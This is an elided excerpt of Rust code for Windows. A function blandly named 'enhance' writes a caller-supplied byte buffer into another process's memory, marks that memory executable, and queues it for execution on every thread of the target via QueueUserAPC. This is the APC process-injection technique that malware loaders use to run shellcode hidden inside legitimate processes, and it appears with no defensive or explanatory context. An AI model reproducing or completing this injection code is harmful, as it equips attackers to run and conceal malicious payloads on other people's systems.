...
use windows::Win32::{
    System::Threading::PROCESS_ALL_ACCESS, UI::Input::Pointer::EnableMouseInPointer,
};
...
fn enhance(buf: &[u8], tar: &u32) {
    ...
    unsafe {
        ...
        let resultBool: BOOL = WriteProcessMemory(
            hProcess,
            resultPtr,
            buf.as_ptr() as _,
            buf.len(),
        ...
        for thread in process.unwrap().threads().unwrap().iter() {
            ...
            let handle = OpenThread(THREAD_ALL_ACCESS, false, thread.id().unwrap());
            let mut old_perms = PAGE_EXECUTE_READ;
            let vpe: BOOL = VirtualProtectEx(
                hProcess,
                resultPtr,
                buf.len(),
                PAGE_EXECUTE_READ,
            ...
            //thanks Nick12
            let qua = QueueUserAPC(Some(std::mem::transmute(resultPtr)), handle.unwrap(), 0);
        }
    }
}
